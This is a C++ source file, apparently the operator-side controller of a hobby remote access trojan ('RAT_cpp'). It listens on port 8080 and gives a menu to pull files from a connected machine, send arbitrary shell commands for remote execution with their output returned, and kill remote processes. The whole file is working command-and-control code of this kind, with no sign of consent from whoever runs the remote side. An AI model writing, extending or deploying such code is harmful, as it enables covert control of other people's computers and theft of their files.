#include <iostream>
#include <string>
#include "../Socket.h"

using namespace std;

void recv_file(string file_path, Connection conn) 
{
        FILE *filehandle = fopen(file_path.c_str(), "wb");
                        if (filehandle != NULL)
                        {
                                bool ok = conn.readfile(filehandle);
                                fclose(filehandle);

                                if (ok) cout <<  "Read file successfully!" << endl;
                                else 
                                {
                                        remove(file_path.c_str());
                                        cout << "Fail to read file!" << endl;
                                }
                                
                        }
                        else 
                                cout << "Cannot open file!" << endl;
}

int main()
{
        try
        {       
                cout << "Waiting... \n"; 
                Connection conn = PortListener(8080).waitForConnection();
                cout << "Connected! \n"; 
                string path_ = "../server/recv/";
                int choice = 1;
                while(choice != 4) 
                {
                        cout << "OPTION: \n";
                        cout << "\t 1.Get file. \n";
                        cout << "\t 2.Create process. \n";
                        cout << "\t 3.Kill process. \n";
                        cout << "\t 4.Quit. \n";
                        cout << "Enter your choice: ";
                        cin >> choice;
                        char num = choice;
                        send(conn.getSocket(), &num, sizeof(num), 0);

                        switch (choice)
                        {
                        case 1:
                        {
                                cout << "Enter the name of file: ";
                                string s;
                                cin >> s;
                                conn.se(s);
                                s = path_ + s;
                                recv_file(s,conn);
                                cout << "\n";
                                break;
                        }
                        case 2:
                        {
                                cout << "Enter command: ";
                                cin.ignore();
                                string s;
                                getline(cin, s);
                                // cout << "command: " << s << endl;
                                conn.se(s);
                                int res = 0;
                                read(conn.getSocket(), &res, sizeof(res));
                                if (res == 0) 
                                {
                                        cout << "Done!\n";
                                        recv_file("mess.txt", conn);
                                        cout << ">Client: \n";
                                        system("cat mess.txt");
                                }
                                else 
                                        cout << "Fail! \n";
                                cout << "\n";
                                break;
                        }
                        case 3:
                        {
                                cout << "Enter pid of process: ";
                                int x;
                                cin >> x;
                                send(conn.getSocket(), &x, sizeof(x), 0);
                                int res = 0;
                                read(conn.getSocket(), &res, sizeof(res));
                                if (res == 0) 
                                        cout << "Kill successfully!\n";
                                else 
                                        cout << "Kill fail! \n";
                                cout << "\n";
                                break;
                        }
                        case 4:
                                cout << "BYE!\n";
                                close(conn.getSocket());
                                break;

                        default:
                                cout << "Reenter your choice! \n";
                                cout << "\n";
                                break;
                        }
                }

                // recv_file("/home/phatnd/HomeLazy/RAT_cpp/recv/hoa.jpg", conn);
                // recv_file("/home/phatnd/HomeLazy/RAT_cpp/recv/imagefile.jpg", conn);


                
        }
        catch (runtime_error &e)
        {
                cerr << e.what() << endl;
                return EXIT_FAILURE;
        }
        return 0;
}